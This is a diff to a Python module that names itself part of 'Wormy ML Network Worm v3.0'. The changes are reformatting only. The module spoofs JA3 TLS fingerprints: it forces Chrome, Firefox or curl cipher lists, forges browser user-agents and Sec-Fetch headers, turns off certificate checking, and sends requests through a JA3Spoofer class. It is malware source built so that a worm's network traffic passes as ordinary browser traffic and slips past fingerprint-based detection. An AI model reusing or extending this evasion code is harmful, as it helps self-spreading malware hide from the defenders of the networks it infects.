@@ -2,23 +2,27 @@
 Wormy ML Network Worm v3.0 - JA3 Fingerprint Spoofing
 Force the TLS client hello to match known-good browser fingerprints.
 """
-import os, sys, ssl, socket, hashlib, struct
-from typing import Optional, Dict, List, Tuple
+
+import hashlib
+import os
+import socket
+import ssl
+import struct
+import sys
 import urllib.request
+from typing import Dict, List, Optional, Tuple
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
-
 
 # ── Known JA3 profiles ───────────────────────────────────────────────────────
 # JA3 = MD5( SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats )
 # We achieve a matching fingerprint by forcing the same cipher suites / extensions.
 
 BROWSER_PROFILES: Dict[str, Dict] = {
-
     "chrome_120": {
         "description": "Chrome 120 on Windows 10",
-        "ja3":         "b32309a26951912be7dba376398abc3b",
+        "ja3": "b32309a26951912be7dba376398abc3b",
         # TLS 1.3 + 1.2, ordered cipher list Chrome uses
         "ciphers": (
             "TLS_AES_128_GCM_SHA256:"
@@ -36,25 +40,26 @@ BROWSER_PROFILES: Dict[str, Dict] = {
         ),
         "tls_version_min": ssl.TLSVersion.TLSv1_2,
         "tls_version_max": ssl.TLSVersion.TLSv1_3,
-        "alpn":            ["h2", "http/1.1"],
-        "user_agent":      ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                            "AppleWebKit/537.36 (KHTML, like Gecko) "
-                            "Chrome/120.0.0.0 Safari/537.36"),
+        "alpn": ["h2", "http/1.1"],
+        "user_agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/120.0.0.0 Safari/537.36"
+        ),
         "headers": {
-            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9",
             "Accept-Encoding": "gzip, deflate, br",
-            "Connection":      "keep-alive",
-            "Sec-Fetch-Dest":  "document",
-            "Sec-Fetch-Mode":  "navigate",
-            "Sec-Fetch-Site":  "none",
+            "Connection": "keep-alive",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none",
             "Upgrade-Insecure-Requests": "1",
         },
     },
-
     "firefox_121": {
         "description": "Firefox 121 on Windows 10",
-        "ja3":         "579ccef312d18482fc42e2b822ca2430",
+        "ja3": "579ccef312d18482fc42e2b822ca2430",
         "ciphers": (
             "TLS_AES_128_GCM_SHA256:"
             "TLS_CHACHA20_POLY1305_SHA256:"
@@ -67,30 +72,30 @@ BROWSER_PROFILES: Dict[str, Dict] = {
         ),
         "tls_version_min": ssl.TLSVersion.TLSv1_2,
         "tls_version_max": ssl.TLSVersion.TLSv1_3,
-        "alpn":            ["h2", "http/1.1"],
-        "user_agent":      ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
-                            "Gecko/20100101 Firefox/121.0"),
+        "alpn": ["h2", "http/1.1"],
+        "user_agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) " "Gecko/20100101 Firefox/121.0"
+        ),
         "headers": {
-            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
             "Accept-Encoding": "gzip, deflate, br",
-            "Connection":      "keep-alive",
+            "Connection": "keep-alive",
             "Upgrade-Insecure-Requests": "1",
-            "Sec-Fetch-Dest":  "document",
-            "Sec-Fetch-Mode":  "navigate",
-            "Sec-Fetch-Site":  "none",
-            "Sec-Fetch-User":  "?1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none",
+            "Sec-Fetch-User": "?1",
         },
     },
-
     "curl_8": {
         "description": "curl 8.x (generic tool traffic)",
-        "ja3":         "7dc465ee29f9cce9fda2a2b69a4f7e9a",
-        "ciphers":     "ECDH+AESGCM:DHE+AESGCM:ECDH+AES128:DHE+AES128:!aNULL:!eNULL",
+        "ja3": "7dc465ee29f9cce9fda2a2b69a4f7e9a",
+        "ciphers": "ECDH+AESGCM:DHE+AESGCM:ECDH+AES128:DHE+AES128:!aNULL:!eNULL",
         "tls_version_min": ssl.TLSVersion.TLSv1_2,
         "tls_version_max": ssl.TLSVersion.TLSv1_3,
-        "alpn":            ["http/1.1"],
-        "user_agent":      "curl/8.4.0",
+        "alpn": ["http/1.1"],
+        "user_agent": "curl/8.4.0",
         "headers": {
             "Accept": "*/*",
         },
@@ -111,12 +116,12 @@ class JA3Spoofer:
 
     def __init__(self, profile: str = "chrome_120"):
         if profile not in BROWSER_PROFILES:
-            raise ValueError(f"Unknown profile '{profile}'. "
-                             f"Available: {list(BROWSER_PROFILES)}")
+            raise ValueError(
+                f"Unknown profile '{profile}'. " f"Available: {list(BROWSER_PROFILES)}"
+            )
         self.profile_name = profile
-        self.profile      = BROWSER_PROFILES[profile]
-        logger.info(f"JA3 spoofer: profile={profile} "
-                    f"({self.profile['description']})")
+        self.profile = BROWSER_PROFILES[profile]
+        logger.info(f"JA3 spoofer: profile={profile} " f"({self.profile['description']})")
 
     def get_ssl_context(self) -> ssl.SSLContext:
         """
@@ -125,7 +130,7 @@ class JA3Spoofer:
         """
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         ctx.check_hostname = False
-        ctx.verify_mode    = ssl.CERT_NONE
+        ctx.verify_mode = ssl.CERT_NONE
 
         # Set TLS version bounds
         ctx.minimum_version = self.profile["tls_version_min"]
@@ -162,21 +167,20 @@ class JA3Spoofer:
         }
         return headers
 
-    def make_request(self, url: str, method: str = "GET",
-                     data: bytes = None,
-                     extra_headers: Dict = None) -> Optional[bytes]:
+    def make_request(
+        self, url: str, method: str = "GET", data: bytes = None, extra_headers: Dict = None
+    ) -> Optional[bytes]:
         """
         Execute an HTTP/HTTPS request with the spoofed JA3 fingerprint.
         Returns raw response body or None on failure.
         """
-        ctx     = self.get_ssl_context()
+        ctx = self.get_ssl_context()
         headers = self.get_headers(extra_headers)
 
         try:
-            req = urllib.request.Request(url, data=data, method=method,
-                                         headers=headers)
+            req = urllib.request.Request(url, data=data, method=method, headers=headers)
             handler = urllib.request.HTTPSHandler(context=ctx)
-            opener  = urllib.request.build_opener(handler)
+            opener = urllib.request.build_opener(handler)
             with opener.open(req, timeout=15) as resp:
                 return resp.read()
         except Exception as e:
@@ -200,11 +204,11 @@ class JA3Spoofer:
 
     def get_status(self) -> Dict:
         return {
-            "profile":     self.profile_name,
+            "profile": self.profile_name,
             "description": self.profile["description"],
-            "target_ja3":  self.profile["ja3"],
-            "alpn":        self.profile["alpn"],
-            "user_agent":  self.profile["user_agent"],
+            "target_ja3": self.profile["ja3"],
+            "alpn": self.profile["alpn"],
+            "user_agent": self.profile["user_agent"],
         }
 
 
